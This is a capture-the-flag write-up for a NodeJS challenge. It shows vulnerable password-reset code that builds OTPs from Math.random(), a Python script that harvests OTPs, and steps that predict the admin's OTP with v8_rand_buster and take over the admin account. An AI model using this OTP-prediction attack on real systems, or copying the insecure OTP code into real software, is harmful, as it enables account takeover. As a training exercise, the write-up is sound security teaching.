# D0nutShop

tl;dr
- Exploit Math.random() vulnerability

## Solution

In this challenge, participants are provided with the source code of a website built using NodeJS.

<img width="1679" alt="image" src="https://github.com/user-attachments/assets/37ae3c23-4b9f-4fc8-b1ab-5357076b8fa5" />

Participants provided with user level credentials `d0nut:d0nutboi`. Look at the source code the flag can be obtained if we logged in as admin level.

```js
router.get('/dashboard', (req, res) => {
    if (!req.session.user || req.session.role !== 'admin') {
        console.error(`[ERROR] GET /admin/dashboard - Unauthorized access attempt by ${req.session.user}`);
        return res.status(403).send('<h1>Forbidden</h1><p>You do not have access to this page.</p>');
    }

    const flagPath = path.join(__dirname, '../flag.txt');
    fs.readFile(flagPath, 'utf-8', (err, flagContent) => {
        if (err) {
            console.error(`[ERROR] Unable to read flag.txt: ${err}`);
            return res.status(500).send('<h1>Error</h1><p>Unable to display the flag.</p>');
        }

        res.render('dashboard', {
            username: req.session.user,
            role: req.session.role,
            flag: flagContent
        });
    });
});
```

The website includes a password reset feature.

<img width="1678" alt="image" src="https://github.com/user-attachments/assets/290839e8-1a58-4755-a0f1-b4589f56fd55" />

This code is responsible for handling the password reset process.

```js
const express = require('express');
const { generateOtp } = require('../utils/otpStore');
const router = express.Router();
const users = require('../utils/users');

const otpStore = {};

router.get('/', (req, res) => {
    res.render('reset/request-otp');
});


router.post('/', (req, res) => {
    const { username } = req.body;
    console.log(`[INFO] POST /reset - OTP request received for username: ${username}`);

    if (!username) {
        console.error(`[ERROR] POST /reset - Username not provided`);
        res.status(400).send('<h1>Error</h1><p>Username is required.</p>');
        return;
    }

    if (!users[username]) {
        console.error(`[ERROR] POST /reset - Invalid username: ${username}`);
        res.status(400).send('<h1>Error</h1><p>Invalid username.</p>');
        return;
    }

    console.log(username);

    const otp = generateOtp(username);

    console.log(otp);
    
    otpStore[username] = otp;
    console.log(`[INFO] POST /reset - OTP generated for username: ${username}, OTP: ${otp}`);

    res.render('reset/verify-otp', { username });
});

router.post('/verify', (req, res) => {
    const { username, otp } = req.body;
    console.log(`[INFO] POST /reset/verify - OTP verification request for username: ${username}, OTP: ${otp}`);

    if (!otpStore[username] || otpStore[username] !== parseInt(otp)) {
        console.error(`[ERROR] POST /reset/verify - Invalid OTP for username: ${username}`);
        res.render('reset/invalid-otp');
        return;
    }

    delete otpStore[username];

    req.session.otpVerified = true;
    req.session.username = username;

    console.log(`[DEBUG] Session after OTP verification: ${JSON.stringify(req.session)}`);
    console.log(`[INFO] POST /reset/verify - OTP verified successfully for username: ${username}`);

    res.render('reset/change-password');
});

router.post('/change-password', (req, res) => {
    console.log(`[DEBUG] Session at password reset: ${JSON.stringify(req.session)}`);

    if (!req.session.otpVerified) {
        console.error(`[ERROR] POST /reset/change-password - Unauthorized access`);
        res.status(403).send('<h1>Unauthorized</h1><p>You must verify your OTP before resetting your password.</p>');
        return;
    }

    const username = req.session.username;

    if (!users[username]) {
        console.error(`[ERROR] POST /reset/change-password - Invalid username: ${username}`);
        res.status(400).send('<h1>Error</h1><p>Invalid username.</p>');
        return;
    }

    const { newPassword } = req.body;

    users[username].password = newPassword;
    console.log(`[INFO] POST /reset/change-password - Password changed successfully for username: ${username}`);

    req.session.destroy(err => {
        if (err) {
            console.error(`[ERROR] Failed to clear session after password reset: ${err.message}`);
            res.status(500).send('<h1>Error</h1><p>Failed to reset session. Please log out manually.</p>');
        } else {
            res.render('reset/password-changed');
        }
    });
});

router.post('/api/get-otp', (req, res) => {
    const { username, password } = req.body;
    console.log(`[INFO] POST /reset/api/get-otp - OTP retrieval attempt for username: ${username}`);

    if (!users[username] || users[username].password !== password) {
        console.error(`[ERROR] POST /reset/api/get-otp - Invalid username or password for username: ${username}`);
        res.status(403).json({ error: 'Unauthorized', message: 'Invalid username or password.' });
        return;
    }

    const otp = otpStore[username];
    if (!otp) {
        console.error(`[ERROR] POST /reset/api/get-otp - No OTP found for username: ${username}`);
        res.status(404).json({ error: 'Not Found', message: 'No OTP generated for this user.' });
        return;
    }

    console.log(`[INFO] POST /reset/api/get-otp - OTP retrieved for username: ${username}, OTP: ${otp}`);
    res.json({ username, otp });
});

module.exports = router;
```

The OTP is generated by `generateOtp()` function that has vulnerability in the `Math.random()` 

```js
const CONST = 10000000;
const otpStore = {};

function generateOtp(username) {
    const otp = Math.floor(CONST * Math.random());
    otpStore[username] = otp;
    return otp;
}

function verifyOtp(username, otp) {
    if (otpStore[username] && parseInt(otp) === otpStore[username]) {
        delete otpStore[username];
        return true;
    }
    return false;
}

module.exports = { generateOtp, verifyOtp };
```

The `Math.random()` function is not cryptographically-secure random number generator, so we can predict the OTP. We can use the tool https://github.com/d0nutptr/v8_rand_buster to predict the next Math.random() number that has been floored.

The solution idea is as follows:

1. Perform multiple password reset attempts for the user `d0nut` to collect several OTPs, which will be used to predict the next OTP.

`gather.py`

```py
import requests

for i in range(0,10):
    burp0_url = "http://localhost:9000/reset"
    burp0_cookies = {"connect.sid": "s%3ANAPOGAgF5O8LG8JGj-dJYIN5lgbyrKW6.Zp1PDaWTVaFtWan1Osv%2BKfgBPTQ4XBW1K5yng4lBees"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 GLS/100.10.9939.100", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://challenge.ctf.games:32749", "Connection": "close", "Referer": "http://challenge.ctf.games:32749/reset", "Upgrade-Insecure-Requests": "1", "sec-ch-ua-platform": "\"Windows\"", "sec-ch-ua": "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not=A?Brand\";v=\"24\"", "sec-ch-ua-mobile": "?0", "Priority": "u=0, i"}
    burp0_data = {"username": "d0nut"}
    requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)


    burp0_url = "http://localhost:9000/reset/api/get-otp"
    burp0_cookies = {"connect.sid": "s%3ANAPOGAgF5O8LG8JGj-dJYIN5lgbyrKW6.Zp1PDaWTVaFtWan1Osv%2BKfgBPTQ4XBW1K5yng4lBees"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 GLS/100.10.9939.100", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://challenge.ctf.games:32749", "Connection": "close", "Referer": "http://challenge.ctf.games:32749/reset", "Upgrade-Insecure-Requests": "1", "sec-ch-ua-platform": "\"Windows\"", "sec-ch-ua": "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not=A?Brand\";v=\"24\"", "sec-ch-ua-mobile": "?0", "Priority": "u=0, i"}
    burp0_data = {"username": "d0nut", "password": "d0nutboi"}
    r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

    otp = r.json()['otp']

    f = open('codes.txt', 'a')
    f.write(str(otp) + "\n")

    f.close()
```

<img width="477" alt="image" src="https://github.com/user-attachments/assets/23fba62c-95b6-42ed-8bfa-acc5c9348e22" />

3. Use `v8_rand_buster` tool to predict next OTP

<img width="691" alt="image" src="https://github.com/user-attachments/assets/9d6edd08-2cbf-466a-bd23-6fe80676cc67" />



2. Initiate a password reset for the admin account and use the predicted OTP.

<img width="1680" alt="image" src="https://github.com/user-attachments/assets/5edde682-f659-48d7-86c5-f0fc2561a575" />

<img width="1680" alt="image" src="https://github.com/user-attachments/assets/8bc87ca5-e239-41e4-ada7-ccbfbf6c209d" />

<img width="1680" alt="image" src="https://github.com/user-attachments/assets/c1c0e5d7-f773-4bf7-84d3-0a82817b99c6" />


3. Log in to /dashboard as the admin to retrieve the flag.

<img width="1680" alt="image" src="https://github.com/user-attachments/assets/f2f7faf9-6534-421a-b5cc-0ca2b6ac6b3a" />

<img width="763" alt="image" src="https://github.com/user-attachments/assets/6af68306-1a9c-45a7-9740-c9dbf4e3e9a7" />
